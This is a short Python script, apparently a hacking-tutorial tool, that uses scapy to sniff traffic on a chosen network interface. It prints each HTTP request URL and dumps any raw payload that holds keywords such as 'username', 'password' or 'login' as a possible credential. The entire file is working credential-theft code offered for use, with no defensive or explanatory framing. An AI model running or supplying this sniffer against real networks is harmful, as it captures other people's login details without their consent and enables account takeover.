#!/usr/bin/env python

# Refactor Code
import scapy.all as scapy
from scapy.layers import http
import argparse


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', dest='interface', help='Please Specify Interface for which packet is supposed to be captured.')
    options = parser.parse_args()
    if not options.interface:
        parser.error('[-] Interface not supplied')
    return options.interface


def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print('[+] HTTP Requests >> {}'.format(url), '\n')
        cred = get_credentials(packet)
        if cred:
            print('\n\n[+] Possible Username/Password >> {}'.format(cred), '\n\n')


def get_url(packet):
    return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode('utf-8')


keywords = ('username', 'uname', 'user', 'login', 'password', 'pass', 'signin', 'signup', 'name')


def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
        field_load = packet[scapy.Raw].load.decode('utf-8')
        for keyword in keywords:
            if keyword in field_load:
                return field_load


interface = get_args()
sniffer(interface)
